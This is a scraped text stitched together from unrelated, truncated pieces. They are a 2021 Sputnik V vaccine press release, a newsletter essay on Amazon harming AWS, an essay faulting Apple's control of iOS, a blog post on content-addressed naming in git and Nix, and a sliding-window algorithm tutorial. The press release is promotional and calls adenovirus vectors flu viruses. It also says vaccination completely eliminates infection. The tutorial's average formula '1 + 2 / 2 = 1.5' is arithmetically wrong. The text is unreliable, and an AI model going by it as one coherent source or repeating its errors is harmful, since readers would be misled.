<b>Moscow, February 2, 2021</b> – The Gamaleya National Research Center of Epidemiology and Microbiology of the Ministry of Health of the Russian Federation and the Russian Direct Investment Fund (RDIF, Russia’s sovereign wealth fund) announce that the Lancet, one of the world's oldest and most respected medical journals, has published interim results of a Phase III clinical trial of Sputnik V, confirming the vaccine’s high efficacy and safety. Sputnik V, which is based on a well-studied human adenoviral vectors platform, is the world’s first registered vaccine against coronavirus.
</p>
<p>
In the interim efficacy analysis of the randomized, double-blind, placebo-controlled clinical trial, where data on 19,866 volunteers were included in the efficacy analysis (14,964 of whom received the vaccine and 4,902 the placebo), the two-dose treatment of Sputnik V administered 21 days apart demonstrated efficacy of 91.6% against COVID-19. The calculation is based on the analysis of 78 confirmed cases of COVID-19 identified in the placebo group (62 cases) and in the vaccine group (16 cases). Sputnik V generated a robust humoral and cell mediated immune response.
</p>
<p>
<b>Alexander Gintsburg, Director of the Gamaleya Research Institute of Epidemiology and Microbiology,</b> said:
</p>
<p>
“The publication of internationally peer reviewed data on Sputnik V’s clinical trial results is a great success in the global battle against the COVID-19 pandemic. The Russian vaccine’s safety and high efficacy are shown by the hard scientific data presented and I congratulate the entire team of Gamaleya National Research Center for this monumental achievement. Several vaccines have already been created based on human adenoviruses and this tool is one of the most promising for development of new vaccines in the future.”
</p>
<p>
<b>Kirill Dmitriev, CEO of the Russian Direct Investment Fund,</b> commented:
</p>
<p>
“This is a great day in the fight against the COVID-19 pandemic. The data published by The Lancet proves that not only Sputnik V is the world’s first registered vaccine, but also one of the best. It fully protects against severe COVID-19 according to data which has been independently compiled and reviewed by peers and then published in The Lancet. Sputnik V is one of only three vaccines in the world with efficacy of over 90% but outperforms them in terms of safety, ease of transportation due to storage requirements of +2 to +8 degrees and a more affordable price. Sputnik V is a vaccine for all mankind.”
</p>
<p>
<b>Hildegund C.J. Ertl, M.D., Professor, Vaccine &amp; Immunotherapy Center, The Wistar Institute, USA,</b> said:
</p>
<p>
“The vaccine is 100% effective in preventing serious disease or death, which in the end is the most crucial parameter; we can all deal with the sniffles as long as we stay out of the hospital or the graveyard. Even after a single dose of this prime-boost regimen protection against disease was at 87.6%. Sputnik V is thus more effective than the AstraZeneca or Johnson&amp;Johnson. Sputnik V, which, unlike the equally efficacious RNA vaccines of Pfizer and Moderna, can be stored in the fridge, will be of tremendous value to combat the global COVID-19 pandemic.”
</p>
<p>
<b>Cecil Czerkinsky, PhD, M.D., Research Director, National Institute of Health and Medical research (Inserm), France,</b> said:
</p>
<p>
“The interim results of the phase 3 clinical trial of Sputnik V COVID adenovirus vector vaccine are fairly impressive. This vaccine appears to be highly efficacious and immunogenic across age groups. This is clearly good news as this dual formulation vaccine is comparatively easy to manufacture and to deploy amid the anticipated global shortage of vaccines and logistical problems in vaccination roll-out of temperature-sensitive vaccines recently authorized for emergency use.”
</p>
<p>
<b>Omar Sued, President of the Society of infectologists, Argentina,</b> said:
</p>
<p>
“The paper, published in The Lancet, confirms successful results and provides additional information about the efficacy and the safety of this vaccine in different subgroups. From the public health´s point of view, the efficacy of the vaccine was very high. The safety profile was very good. The dissemination of this information is vital for informing the scaling up and rollout of this vaccine worldwide.”
</p>
<p>
<b>David Livermore, Professor of Medical Microbiology at the University of East Anglia, UK,</b> said:
</p>
<p>
“Presently the world needs all the good vaccines that it can get against COVID-19. And these are impressive results: Sputnik V is the first adenovirus vector vaccine to achieve the 90% efficacy seen with the two mRNA vaccines.”
</p>
<p>
According to the peer-reviewed study results, the vaccine provides full protection against severe cases of the novel coronavirus infection. Among the confirmed severe cases of COVID-19, 20 were recorded in the placebo group, while none were recorded in the vaccine group. Due to the time needed for the immune response to develop, in the first week after vaccination there was no significant difference in protection against severe cases of COVID-19 between the vaccine and placebo groups, while in the period from 7 to 14 days the vaccine’s efficacy rose to 50%, in the period from 14 to 21 days to 74.1%, and to 100% from the 21st day, giving full protection against severe cases of the coronavirus.
</p>
<p>
Importantly, the study included 2,144 volunteers over 60 years old with the maximum ages of 87 years (vaccine group) and 84 years (placebo group), showing great safety results for the elder age strata. The vaccine’s efficacy for the elderly was shown at 91.8% and did not differ statistically from the group of 18-60 years old, also demonstrating great safety and immunogenicity results.
</p>
<p>
Sputnik V has demonstrated an excellent safety profile: 70 episodes of serious adverse events (SAE) not related to COVID-19 were recorded in 68 study participants: in 45 volunteers from the vaccine group and 23 volunteers from the placebo group. None of these events were associated with the vaccination as confirmed by Independent Data Monitoring Committee. Most adverse events (94%) were mild and were limited to flu-like syndromes, injection site reactions, headache and asthenia.
</p>
<p>
Sputnik V is one of only three vaccines in the world to have demonstrated efficacy of over 90%. Sputnik V stands out among these vaccines thanks to a number of key advantages, namely: a well-studied and highly efficient human adenoviral vector mechanism proven safe over decades; the vaccine’s low cost in comparison to other approaches; and fewer logistics requirements with a storage temperature of between two to eight degrees Celsius allowing for easier distribution worldwide.
</p>
<p>
The safety of vaccines based on human adenoviruses has been confirmed in more than 75 international publications and more than 250 clinical trials conducted during the past two decades - while the history of use of human adenoviruses in vaccine development started in 1953. Adenovirus vectors are genetically modified viruses of the regular flu that cannot reproduce in a human body. When the Sputnik V vaccine is used, the coronavirus itself does not enter the body as the vaccine only contains genetic information about part of its outer protein coat, the so called "spikes" forming its crown. This completely eliminates the possibility of getting infected as a result of vaccination while also causing the body to generate a stable immune response.
</p>
<p>
In addition, Sputnik V uses two different vectors - based on human adenovirus serotypes Ad5 and Ad26 - in two separate shots, allowing for a more effective defense against the coronavirus than vaccines using the same vector for both shots. By deploying two different vectors, Sputnik V avoids a possible neutralizing effect and generates a durable and longer-lasting immune response.

<p><em>In each issue of the “Cloud Irregular” newsletter, I’ll try to provide a useful piece of commentary on some tech-related topic. After that I’ll let you know about any new stuff I’ve published, or upcoming talks. Then I’ll give you something extremely silly, just to cleanse your palate, and we’ll be done.</em></p>

<p><em>Sound good? If so, throw in your email at the bottom of this post.</em></p>

<h3 id="amazon-won-t-spin-off-aws-and-that-s-too-bad-for-aws">Amazon won’t spin off AWS, and that’s too bad for AWS</h3>

<p>First let’s make one thing perfectly clear: Amazon and AWS are not splitting up. AWS CEO Andy Jassy has <a href="https://www.cnbc.com/2019/06/11/aws-ceo-we-would-follow-the-law-if-regulators-demand-amazon-spin-out.html">repeatedly avowed</a> that the only way AWS will ever leave the mothership is if federal regulators feed him feet first into a wood chipper.</p>

<p>On one level, this makes sense. AWS still generates something like <a href="https://www.cnbc.com/2019/04/25/aws-earnings-q1-2019.html">half of Amazon’s operating income</a>. Amazon can wrap its tentacles around every facet of the consumer experience because of the big dollars rolling in from its cloud business. AWS’s dominance fuels big AMZN share prices and funds new innovation, etc, etc. We get it: Amazon will let go of AWS when you pry it from <a href="https://www.telegraph.co.uk/technology/2017/07/28/biceps-billionaire-doesnt-matter-jeff-bezos-not-worlds-richest/">Jeff Bezos’ weirdly fearsome biceps</a>.</p>

<p>That’s what AWS does for Amazon. But what does Amazon do for AWS? Increasingly, as far as I can tell, bad things.</p>

<p>Let’s lay aside for a moment the whole regulatory question, whether AWS and Amazon will someday be trust-busted and broken up by force. The 2020 presidential candidates can <a href="https://www.nytimes.com/2019/03/08/us/politics/elizabeth-warren-amazon.html">hash that out</a>. Amazon is causing other political problems for AWS already.</p>

<p>Look, Amazon is huge; it’s owned by the richest man in the world, who increasingly owns <a href="https://www.marketwatch.com/story/its-not-just-amazon-and-whole-foods-heres-jeff-bezos-enormous-empire-in-one-chart-2017-06-21">other things</a> as well. That means bad vibes from some other venture can poison AWS deals.</p>

<p>Remember <a href="https://defensesystems.com/articles/2018/07/26/jedi-hits-the-street.aspx">JEDI</a>, that $10 billion single-vendor Department of Defense contract AWS has been craving for what seems like years? Apparently the whole bid process <a href="https://www.theregister.co.uk/2019/07/18/jedi_cloud_donald_trump/">is now on hold</a>, not because of anything AWS did wrong, but because, well, Jeff Bezos also owns the Washington Post, which Donald Trump does not appreciate, and so it’s all a mess. (Also, I love that Oracle has been apparently fomenting all this strife via Machiavellian backstage dealings, which I guess is Oracle’s whole brand now.)</p>

<p>There’s also the issue of AWS selling technology, directly or indirectly, to government agencies and police forces who use it for dubious purposes like <a href="https://www.theverge.com/2018/6/22/17492106/amazon-ice-facial-recognition-internal-letter-protest">facial recognition</a>. Werner Vogels’ recent AWS Summit keynote address suffered <a href="https://www.wsj.com/articles/protesters-disrupt-amazon-event-over-its-ties-with-ice-11562882825">no fewer than five interruptions</a> from protesters angry that AWS services support the operations of US Immigrations and Customs Enforcement (ICE).</p>

<p>While this might seem to be AWS’s problem, I guarantee that the name recognition of Amazon among everyday consumers drives a lot of the public outrage. (That’s why you often see Amazon-dot-com protests misdirected at AWS events. I’ve seen protesters interrupt an AWS summit with signs and shouts about Amazon warehouse conditions. The lines are blurry and it’s no wonder people get confused.)</p>

<p>Take Amazon out of the equation, and for better or worse the scrutiny of AWS goes down. To put it another way, there’s like a 50% chance that anyone running a big Oracle cluster at this point is a supervillain, but you don’t see Oracle getting protested.</p>

<p>Leaving aside the public sector issues, we have Gartner’s new magic quadrant report (I know, stay with me) <a href="https://www.crn.com.au/news/aws-azure-and-google-top-gartners-iaas-magic-quadrant-528501">reminding us</a> that many companies, particularly retailers, are now eschewing AWS out of an existential fear that they are funneling dollars indirectly to their biggest competitor. <a href="https://www.geekwire.com/2018/least-one-retailer-online-outlet-zulily-still-willing-sign-amazon-web-services/">Walmart, Target, and Kroger</a> are all notorious for their no-AWS tech policies, with Amazon’s 2017 acquisition of Whole Foods apparently the last straw.</p>

<p>This is bad enough, but survivable: AWS can and does thrive without Walmart’s business. But Walmart actually takes their policy a lot further: they now <a href="https://www.techrepublic.com/article/walmart-forces-tech-partners-to-leave-aws-following-whole-foods-acquisition/">require their tech partners to stay off AWS as well</a>. These retailers (and <a href="https://www.digitalcommerce360.com/2019/06/09/nearly-50-of-health-systems-see-amazon-as-a-threat/">healthcare providers</a>, and <a href="https://www.cnbc.com/2019/03/16/why-volkswagen-chose-microsoft-azure-over-aws.html">car companies</a>, and whatever industry Amazon disrupts next) are fighting for their lives, and they’ll play every card they hold to swing their sizable partner ecosystems toward Microsoft or Google. The competing cloud platforms, for their part, are perfectly willing to push this narrative, <a href="https://www.cnbc.com/2019/02/12/microsoft-google-cloud-pitch-vs-aws-we-wont-compete-with-you.html">swearing up and down</a> that they won’t “compete with partners”.</p>

<p>So here’s the reality on the ground. I just got back from <a href="https://www.dashcon.io/talks/when-bad-architectures-happen-to-good-people/">speaking at Dash</a>, Datadog’s New York conference focused on next-generation ops and infrastructure (though mostly, let’s be real, focused on Datadog). I took an informal survey of tech leads there, people building SaaS platforms for everything from real estate to nonprofits to IoT. Not things Amazon competes with directly. But nearly all of these vendors have, or want to believe that they will land, the kind of big customer that may have a “no AWS” policy.</p>

<p>So with few exceptions, they are hedging their bets. They build on containers in a misplaced belief that will make quick migrations easier, they architect dubious “multi-cloud” workloads … the point is, they’re not using AWS the way it’s designed to be used, as a holistic, deeply integrated platform, and the looming shadow of Amazon is the reason why.</p>

<p>Of course, the whole “I can’t go all-in on AWS because some of my own customers might distrust AWS, because they in turn fear Amazon” thing is such a delightfully screwy reason for making suboptimal tech choices. It reminds me of the old fundamentalist idea of <a href="https://www.patheos.com/blogs/religionnow/2017/10/secondary-separation-islam/">secondary separation</a>, where you shun an innocent person because they’ve insufficiently disassociated themselves from heretics.</p>

<p>The problem with secondary separation, as the fundamentalists discovered, is that it has no logical stopping point. What degree of separation is enough? How many layers of vendors must you purge before you can be sure you’re not bankrolling heresy, or Amazon? The whole conversation is faintly dumb, but it’s <em>happening</em>, and that’s a problem for AWS as much as for the engineering teams who have to work around them.</p>

<p>So let’s recap the reasons Amazon may be harming AWS:</p>

<ul>
<li><p>Amazon’s name recognition creates a target on AWS’s back when they want to work in politically-charged areas</p></li>

<li><p>Jeff Bezos’s other business ventures and feud with the president jeopardize AWS’s government contracts</p></li>

<li><p>Companies that compete with Amazon don’t want to use AWS services</p></li>

<li><p>Companies that want to attract business from Amazon competitors avoid AWS, or use it less fully</p></li>
</ul>

<p>None of these things are that bad on their own, at least not yet. But they all keep AWS from being the best, most juggernaut-y version of itself. They keep AWS’s services from competing on equal footing in the marketplace. And that’s a shame, because the tech itself is often pretty great.</p>

<p>It’s worth noting that <a href="https://www.businessinsider.com/scott-galloway-amazon-will-spin-off-amazon-web-services-ignition-2018-12">some smart people</a> think Amazon will eventually have to spin off AWS just because AWS would be so valuable and do so well in the market as a “pure cloud” player. But AWS is a victim of its own success. It’s not going anywhere because Amazon depends on it. And as Amazon expands to threaten more industries, AWS may paradoxically become less successful. It’s a weird bind.</p>

<p>At any rate, unless something big changes in the regulatory landscape, Amazon and AWS will probably remain joined at the hip. And I’ll keep having frustrating conversations with more and more clients about why they can’t use the best cloud services on the market.</p>

<p><em>Disclaimer: I work for an AWS consulting partner, but I own no $AMZN stock and have no direct interest in what Amazon does with AWS.</em></p>

</div></div><div data-block-type="2" id="block-78a04d1642024dbcaa69"><div><p><strong>Chapter One: The Creation of Today’s Internet and the Needs of Tomorrow’s</strong></p><p>One of the neat things about the internet is who created it, why, and how.&nbsp;</p><p>Throughout the 1960s to 1990s, the foundation of today’s internet was built through a variety of consortiums and informal working groups composed of government research labs, public universities and independent technologists. These typically not-for-profit collectives typically focused on establishing common standards that would help them share information from one server to another (i.e. messages or files), and in doing so, make it easier to collaborate on future technologies, projects and ideas.&nbsp;</p><p>The internet’s quirky provenance is responsible for many of its best modern attributes. Today, everyone can create content on the internet, everyone is technically capable of accessing everything on the internet, and every web page on the internet can connect to another without the user needing to change browser, device or client. This flexibility, interoperability and universality isn’t by decree - there’s no Head of the Internet mandating the right to create, host or access/connect to a website.&nbsp;</p><p>Instead, this is a byproduct of the internet’s open standards, programming, markup languages and so on. These ensure that a user doesn’t need to pay for a web browser or to load a website, nor does the owner of a website need to pay for the code used by their website. Services like Zoom also work because they leverage actively maintained standards that are free to use and designed to support any device. Every device maker needs to support these standards in order to have happy customers. Some of us now recoil against aggressive data collection, ad insertions and tracking, but this is partly because we don’t <em>need</em> to give these up. The use of standards, such as HTML, means that browser extensions can block ads or tracking. We may be willing to give up data for a free service, but the Internet’s makeup means we don’t have to.</p><p>The benefits here are hard to overstate. But just imagine, for example, how the internet might differ if it had been created by multinational media conglomerates in order to sell things, serve ads or harvest user data for profits. Downloading a .JPG could cost money, with a .PNG costing 50% more. Teleconferencing software might have required the use of a broadband operator’s app or portal (e.g. Welcome to your Xfinity Browser™, click here for Xfinitybook™ or XfinityCalls™ powered by Zoom™). Websites might only work in Internet Explorer <em>or</em> Chrome - and need to pay a given browser an annual fee for the privilege. Or maybe users would need to pay their broadband provider extra fees to read certain programming languages or use a given web technology (“This website requires Xfinity Premium with 3D Rendering”). Regardless of the specific differences, it’s likely internet penetration would be lower, as would usage and associated commerce.</p><p>The web’s cross-platform, standards-based and non-profit origins are inseparable from the internet’s rapid growth, the trillions of dollars in companies that have been founded over the past 30 years, and the positive societal impact of these companies (e.g. a drop in the cost and increase in the quality of communications, the reduction in gatekeeper power, lowered transaction fees, etc.).&nbsp;</p><p>Today’s heavily conglomerated internet giants remain mindful of the fact that open APIs, common standards, exportable data, etc., all help grow both the internet technology acceptance model and, in most cases, their own bottom lines. But these companies are less concerned with how the overall market grows than their share and control of this growth. Technology companies, almost by definition, prefer that the market build on top of or through them than have new entrants build around or in competition with them. As a result, the same companies that emerged thanks to openness tend to reject these principles where they might undermine their strategic position.</p><p>This isn’t an unusual disposition for a for-profit company, but the implications are particularly powerful in digital markets. In the offline world, free market economics enable robust competition that typically delivers the best products, variety and prices for consumers, and moderates the power of the strongest market players (if only due to diseconomies of scale). Online, incredibly powerful network effects and zero-cost marginal revenues/distribution has enabled dominant platforms to push back against the open nature of the internet, forcing consumers and creators to use them as universal intermediaries, and subduing standard market forces.</p><p>Right now, we are on the cusp of the next internet. The terms used for this future vary and the degree to which you believe in one label or vision is not particularly relevant. And the technologies to design, enable and support the fullest version of this are as far from the capabilities of 2021 as the 1990s Internet is from us today. But what matters is that a growing share of our time will be spent within virtual spaces and with virtual goods — for education, work, health, politics and leisure. Sometimes these spaces and goods will be purely virtual, other times virtual twins of physical ones, and sometimes augmented reality. For related reasons, a growing percentage of our income will be spent on virtual assets, goods, experiences — many of which we’ll be able to sell, trade, share, use or improve. And of course, enormous new industries, marketplaces and resources will emerge to enable these opportunities, with novel types of labor, skills, professions and certifications invented to serve them.&nbsp;</p><p>There’s no way for this future to be developed as the original internet was. The US government and public research institutions led the development of the information superhighway in part because few in private businesses understood the commercial potential of a World Wide Web, but also because these non-profits were essentially the only entities with the computational talent, resources and ambitions to build it. Conversely, all of today’s mega-tech companies are deep believers in this future internet, and are best positioned (via resources and talent) to build it.&nbsp;</p><p>The most important impediment today is Apple. Although no company has done more to propel the last 15 years of the internet, its policies are unlikely to produce the most prosperous overall ecosystem and do not lay a strong groundwork for the “next Internet”. Instead, Apple is inhibiting this future Internet. And it does so via tolls, controls, and technologies that not only deny what made and still makes the open web so powerful, but also prevents competition, and prioritize Apple’s own profits.</p><p><span><strong>Chapter Two: There’s Apple, then GAFM</strong></span></p><p>Apple’s adverse effects stem from three interconnected and increasingly powerful elements.</p><p>First, Apple believes it knows better than consumers, the developer community, and the market at large. This includes which technologies should be adopted by the internet community, the role of user agency (and the extent to which users are capable of informed consent), and common business practices around user data, privacy and security.</p><p>This disposition led Apple to limit the role of the marketplace <em>on its </em>device (something the company did not do for the Mac). Specifically, Apple mandates that on its devices:</p><ol data-rte-list="default"><li><p>All applications would need to be distributed by the Apple App Store, and could not be directly downloaded from the app maker or a third party app store</p></li><li><p>All applications distributed by the App Store would need to be approved by Apple, and approval would be contingent upon an extensive list of policies and requirements</p></li><li><p>All applications distributed by the Apple App Store would need to conform with the App Store’s billing policies, which typically meant that Apple was the exclusive in-app biller for iOS applications</p></li></ol><p>These three layers are technically different — the ability to use an operating system driver has nothing to do with the ability to distribute an app to the consumer or charge for them for a given piece of content or function. However, Apple’s iOS devices forced them together. If a developer wants to make an app, they need access to native drivers. And if a developer wants access to native drivers, their apps need to be distributed by the App Store. And if they want to use the App Store, they must adhere to Apple’s policies, which means using Apple’s billing systems.&nbsp;</p><p>Apple’s control and integration allowed it to offer a best-in-class mobile experience that also helped repel the most pernicious aspects of the online world; onboard and engage less technically savvy users; and develop a richly monetized app ecosystem. This, in turn, led to unprecedented success. <a href="https://www.ben-evans.com/benedictevans/2020/8/18/app-stores">Today, the iPhone has 66% market share in the United States, 75% of U.S. App Store revenues, and over 80% of time spent on the mobile internet</a> (iOS’s share of physical e-commerce transactions is likely somewhere in the middle of this range). And this dominance is also growing. Eighty percent of U.S. teenagers have iPhones and the device held 90% of smartphone activations in the week after Christmas 2020.</p><p>While Apple’s closed approach is why the company’s products are so successful, the enormity of this success is what makes this approach so problematic. There is no proprietary, closed system that affects more lives on a daily basis than that of iOS. Due to this fact, Apple has become a de facto regulator for the internet; a single for-profit body that wields enormous soft, hard, and even accidental power.&nbsp;&nbsp;</p><p>There are almost no large companies in the world that can live without a mobile app (these apps are …</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>In my <a href="https://about.scarf.sh/post/shea-levy-composition-fanatic">previous post</a>, I remarked on the fact that composition, while central to our work as engineers, is often poorly supported by the tools we use. In this post I want to explore a specific trend away from this state of affairs, where composition is given the first-class treatment it deserves.</p><p>When engineering with atoms, composing components often consists of literally putting them together: you take piece A, move it close to piece B, and combine them by inserting tab X into slot Y. Sometimes an analogous case occurs in software: developers may instantiate instances of two particular design patterns in a class definition and compose them by ensuring the overlap meets both requirements, or copy in a template or project scaffold to compose a general structure with their specific use case.</p><p>Most of the time, however, software engineers compose by <em>reference</em>, making one part of the system conform to the interface of another and indirectly interact with the component exposing the interface through some pointer, handle, or name. These layers of indirection allow for more efficient reuse of components, clearer conceptual boundaries, and more specialized and dynamic composition. This benefits both the humans using the tools and the automated systems operating behind the scenes, at various time scales. Composition by named reference is so fundamental that <a href="https://en.wikipedia.org/wiki/Lambda_calculus">one of the two foundational models of computation</a> revolves exclusively around referencing by name and resolving those references!</p><h2>Programming and networking</h2><p>Traditionally, most sophisticated name-based composition acted at the levels of building programs or of connecting entire machines.</p><p>Composition by name is ubiquitous in programming. We reference packages we want to use by a name and a version. We identify libraries we depend on by name. We call functions, consume data, implement interfaces, etc., all via their names. Then our tools take over: Our editors provide us documentation by name, our compilers look up type information and calling conventions by name, our static and dynamic linkers connect needed functionality across binary components by name.</p><p>Any user of post-Internet computers is intimately familiar with our industry's other venerable usage of names: finding another machine on the network. Every time you type a URL in your search bar, click a link, or configure an application to point to some specific service, you are composing computer resources by name. The most systematized and sophisticated aspect of these names is the <a href="https://en.wikipedia.org/wiki/Domain_Name_System">domain name system</a>, which gives you a high quality way to connect a top level name to a specific machine. Most of the rest of the URL is particular to each individual system, with at best weak conventions governing their use and meaning. But for both human and machine consumers, the domain name contains very precise semantics for composition at the machine level.</p><p>These names are not only crucial operationally, to put everything together in the system, they are also crucial cognitively, to put everything together in our minds. It's a clichéd joke that naming something is one of the two hardest problems in computer science, but that joke is based on the very serious fact that a name lets us treat a complex system as a single unit, and a good name helps us do that effectively.</p><p>DNS and programming language symbol resolution are at this point completely entrenched. They've been around in the relevant forms for the entire productive career of a huge portion of our industry. In more recent decades, however, some new approaches to name-based composition in new domains have emerged.</p><h2>Semantically-meaningful resource naming</h2><p>After the previous section, some of you may be wondering: What about the filesystem? It's true that files and other system resources have long been named by strings, with some weak structure for navigating trees of resources (i.e., the directory separator) and, on some systems, the type of file being named (the file extension). Similarly, other resources have long been referenced by name: <a href="https://google.com/">https://google.com</a> names not the server at google.com, but the specific HTTPS service exposed by that server over TCP port 443.</p><p>The problem with these and other naming systems is that they put too much of the work of composition onto the users. With a few minor exceptions like the <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">filesystem hierarchy standard</a> and file extensions, file paths tell you almost nothing about the file in question that you didn't already know. Almost no one looks at the full URL of a hyperlink and extracts meaningful information from it that wasn't present in the context of the link. This results in the status quo: these names are almost always treated as fully opaque identifiers, and very few common naming rules apply across teams and systems.</p><p>Some systems have taken steps to move beyond this situation, however. In this section I will briefly cover a few novel tools that in some cases have succeeded in and in others promise to provide <em>semantically meaningful</em> names to compose different computational resources.</p><h3>git</h3><p>I assume most of you are familiar with <a href="https://git-scm.com/">git</a>, at a high level. At a primitive level, git operates on various types of <em>objects</em>, such as blobs, commits, or symlinks. At the human interface level, many of these objects are ultimately referenced by ad hoc unstructured names, such as "file x/y/z on branch foo". That being said, you've probably seen commits referenced by a <em>hash</em>, such as 4149457c6358f702fffbefcc2b7f6e8a87f802fb. Hashes like this are what the human-readable names are translated into, and how all of the objects internally refer to each other.</p><p>What do the hashes mean? Each object can be <em>serialized</em>, i.e. written to a file such that it can be correctly reconstructed later, including references to any other objects it depends on. These serializations are <em>canonical</em>, such that any two objects that are the same will have byte for byte the same serialization. Using a <a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">cryptographic hash function</a> on the contents of these serialized files then allows the git tools to give each object a short name that captures the full information content of the object, modulo unlikely hash collisions. We therefore call these <em>content-addressed</em> names.</p><p>Why should we use content-addressed names? In short, because they allow different components of the system to cheaply refer to each other with a high degree of reliability: If some commit object says that its associated filesystem tree has some file at a particular path, I know that whenever I refer to that file via relative references from the commit, I will get a file with exactly the same contents.</p><p>This allows for safe deduplication of files across commits and efficient communication protocols for distributing repositories across the network. It also gives a much more precise meaning to the names in question: "the file at x/y/z" can refer, at different times and on different systems, to any kind of file the relevant filesystem supports, whereas "the file at x/y/z in the tree of commit 4149457c6358f702fffbefcc2b7f6e8a87f802fb" refers, for most intents and purposes, to exactly one file with specific contents.</p><h3>Nix</h3><p><a href="https://nixos.org/manual/nix/stable/#ch-about-nix">Nix</a> is a package manager for Unix systems. It is built on several innovations, but the one relevant for this post is the Nix store, where the filesystem resources associated with packages are managed.</p><p>Like git, Nix manages some of its filesystem resources by content-addressed name, using essentially the same logic as git's hash-based content addressing. By themselves, however, such names are inadequate to Nix's goal of highly reliable and accurate dependency management with composition across packages. If I've built package foo 1.0 against some specific content-addressed instance of package bar 2.0, I can calculate the content and thus a content-addressed name of the resulting package. But if you want to build foo 1.0 against the newly released bar 2.1, you can't reuse anything in that content addressed name and must rebuild from scratch.</p><p>Nix addresses this issue with what I call <em>recipe-addressed</em> names: Some filesystem resources are named not by their own content but by the content of a serialization of <em>a deterministic build recipe</em> for creating it. The nature of these build recipes is such that it is much easier to substitute in different versions, configurations, etc. anywhere in the dependency tree and recalculate what the new name of the results should be.</p><p>With content-addressed names for bootstrapping, and recipe-addressed names for building up more complex packages, Nix opens up a whole new world of package management. Nix can ensure that many different machines, however different their configurations, have exactly the same package installed.</p><p>Nix can safely reuse common dependencies between packages, parallelize builds, and distribute builds across multiple machines. Large centralized binary caches are possible with a <a href="https://www.tweag.io/blog/2020-12-16-trustix-announcement/">decentralized trust mechanism</a> built on top. On top of these capabilities, <a href="https://nixos.org/guides/how-nix-works.html#nixos">entire system configurations</a> can be deterministically captured in a single name, allowing reproducible deployments and much more reliable migration of personal systems across computers.</p><h3>Nelson</h3><p><a href="https://getnelson.io/">Nelson</a> is a "cloud-native" service orchestration framework built to take advantage of modern distribution, resource management, and coordination mechanisms. Among other things, Nelson enables deploying an <a href="https://www.digitalocean.com/community/tutorials/what-is-immutable-infrastructure">immutable infrastructure</a>-style network topology while retaining efficient garbage collection of unneeded services. Nelson achieves this by requiring services to reference each other via name resolution mechanisms it populates from high level service configurations. Each service configuration specifies the other services it depends upon, providing both a service name, which has meaning to the user, and a <a href="https://semver.org/"><em>semantic version</em></a>, which contains information about cross-version compatibility. Nelson leverages the information in the dependency specification and keeps track of which services depend on which, allowing it to safely remove old instances of services that are not …</p></div></div></div></div>

Let's go over a simple problem to see how this can be useful.</p><p>For this problem, we are given an array <code>arr</code>, and a subarray size <code>k</code>, and we are asked to find the <em>average</em> of <em>all</em> subarrays in <code>arr</code> of size <code>k</code>. So given an array like <code>[1, 2, 3, 4]</code> and a subarray size <code>k = 2</code>, the correct answer would be <code>[1.5, 2.5, 3.5]</code> because:</p><ul><li><code>[1, 2, 3, 4]</code> has three subarrays of size 2, namely <code>[1, 2], [2, 3], [3, 4]</code>.</li><li>The average of the first subarray is <code>1 + 2 / 2 = 1.5</code>, the average of the second is <code>2.5</code> (using the same formula), and the average of the third is <code>3.5</code>.</li><li>Putting this together we get the final result <code>[1.5, 2.5, 3.5]</code>.</li></ul><p>Given these steps, it seems pretty clear that in designing an algorithm to solve this problem we would have to (1) iterate through every subarray then (2) find the average of each and append it to the result array.</p><p>A straightforward way to find every subarray of an array is to iterate through each index of the array and <em>construct</em> the subarray that begins at that index by iterating <code>k</code> more times. In this second iteration we can also sum up the numbers to compute the resulting average. Here's what that would look like:</p><p>Doing that for <em>every</em> index in the array, we get the final algorithm:</p><p>Notice the number on the top right of the animation. This number represents the total number of steps required to compute the result given the inputs <code>arr</code> and <code>k</code>. Try adding two more items and see how that number changes—it went up, by a <em>lot</em>.</p><p>Is there a better way?</p><p>Looking back at the algorithm, notice that most of the time we're counting numbers that we've already included before. Let's look at the animation again, this time highlighting all the double counts in red:</p><p>When the algorithm finishes, only 2 elements <strong>were not double counted!</strong> It turns out that no matter what inputs, this implementation will <em>always</em> double count every element except for the first and the last (try playing around with the inputs to convince yourself).</p><p>So why are we double counting in the first place? If we look at the first two subarrays, we see there's a lot of overlap:</p><p>What if, on each step, we only take into account the <em>differences</em> instead? In other words, is there a way to get the sum of the second subarray from the sum of the first? If so, we would be able to <em>derive</em> the sum of the second subarray rather than recounting every element again.</p><p>In the example above, we can get the sum of the <strong>second subarray by subtracting 1 and adding 5</strong> to the sum of the first.</p><p>This reduces the sum computation from <code>k</code> iterations to only one iteration! This is also where the sliding window namesake comes from—it's as if we have a window of 4 items that we <em>slide</em> to the next subarray.</p><p>Maybe adding a border around the items would make the window more clear:</p><p>With this key insight let's rewrite the algorithm. Remember that the algorithm receives two inputs - an array of numbers <code>arr</code> and a size of subarray <code>k</code>.</p><ol><li>At the start, we <em>build</em> the window—iterate until our window contains <code>k</code> items—while keeping track of the sum.</li><li>Then, we <em>slide</em> the window one item over, updating the sum by subtracting the item no longer in the window and adding the item that was added to the window. By doing this we ensure that the sum stays in sync with the items that are in the window.</li><li>With this sum we can compute the average as before.</li></ol><p>And that's the find all averages problem using the sliding window pattern! Notice how this implementation only needs 7 steps to calculate the sum instead of 13 with the previous implementation. Now that doesn't seem to be too big of a difference, but look how blazing fast the optimal implementation is compared to our previous one:</p><p>While the window is building, both algorithms are going at the same pace (try changing the size of k to equal to the size of the array—both algorithms will finish at the same time!). However, once the window is complete, the optimal algorithm blazes off and terminates in less than half the time it takes for the naive algorithm to finish.</p><h2>Generalizing the Pattern</h2><p>Of course we're not limited to only counting averages. The sliding window pattern can be generalized to any problem that involves computing <em>something</em> in the subarray. As long as the problem has some definition of a window size, the pattern essentially boils down to:</p><ol><li>Maintaining some <strong>state</strong> in that window, and</li><li>keeping that state in sync with the items in the window through <strong>constant-time operations</strong>.</li></ol><p>By "constant-time operations" I mean without using further iterations and only using the stuff that leaves/enters the window.</p><p>In the case of the averages problem, the state that we're maintaining is the <strong>sum of the items</strong>. We're keeping this sum in sync with the items in the window by subtracting the item that's leaving and adding the item that's entering.</p><h3>Permutation in a String</h3><p>Here's another problem that makes use of the same concept of maintaining state and synchronizing that state. The problem's pretty simple—given a string and some pattern, determine if the string contains any <em>permutation</em> of that pattern. For example, given the string <code>aaacb</code> and the pattern <code>abc</code>, the algorithm should return <code>true</code> because the substring <code>acb</code> is a permutation of <code>abc</code>.</p><p>This is not as obvious of a 